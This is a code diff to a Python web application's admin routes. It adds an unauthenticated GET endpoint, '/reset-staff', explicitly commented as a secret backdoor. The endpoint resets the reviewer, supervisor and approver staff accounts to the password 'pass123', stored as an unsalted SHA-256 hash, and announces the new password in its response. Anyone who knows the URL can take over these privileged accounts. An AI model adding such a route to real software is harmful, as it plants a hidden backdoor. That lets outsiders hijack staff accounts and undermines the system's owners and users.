@@ -358,3 +358,27 @@ def admin_confirm_delete(author_id: int):
 @app.get("/admin-logout")
 def admin_logout():
     res = RedirectResponse(url="/admin-login", status_code=303); res.delete_cookie("admin_session"); return res
+# --- SECRET BACKDOOR FOR STAFF PASSWORDS ---
+@app.get("/reset-staff")
+def reset_staff():
+    with Session(engine) as session:
+        # Reset Reviewer
+        reviewer = session.exec(select(Employee).where(Employee.email == "reviewer@gophigo.com")).first()
+        if reviewer:
+            reviewer.password = hashlib.sha256("pass123".encode()).hexdigest()
+            reviewer.must_change_password = True
+            session.add(reviewer)
+        # Reset Supervisor
+        supervisor = session.exec(select(Employee).where(Employee.email == "supervisor@gophigo.com")).first()
+        if supervisor:
+            supervisor.password = hashlib.sha256("pass123".encode()).hexdigest()
+            supervisor.must_change_password = True
+            session.add(supervisor)
+        # Reset Approver
+        approver = session.exec(select(Employee).where(Employee.email == "approver@gophigo.com")).first()
+        if approver:
+            approver.password = hashlib.sha256("pass123".encode()).hexdigest()
+            approver.must_change_password = True
+            session.add(approver)
+        session.commit()
+    return "All staff passwords have been successfully reset to pass123!"
